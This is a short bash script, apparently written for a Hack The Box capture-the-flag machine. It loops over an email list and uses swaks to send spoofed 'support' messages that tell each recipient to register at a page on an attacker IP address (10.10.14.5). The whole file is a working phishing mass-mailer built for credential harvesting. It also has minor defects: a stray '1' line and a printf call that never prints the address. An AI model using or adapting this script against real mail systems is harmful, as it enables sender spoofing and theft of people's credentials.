#!/usr/bin/bash
1
for email in $(cat email_list)
do
	printf "[!] Trying for: " $email
	swaks	--to $email \
		--from "support@sneakycorp.htb"\
		--server "sneakycorp.htb"\
		--h-Subject "Register Account"\
		--body "Register your account at http://10.10.14.5/register.php"
done
		
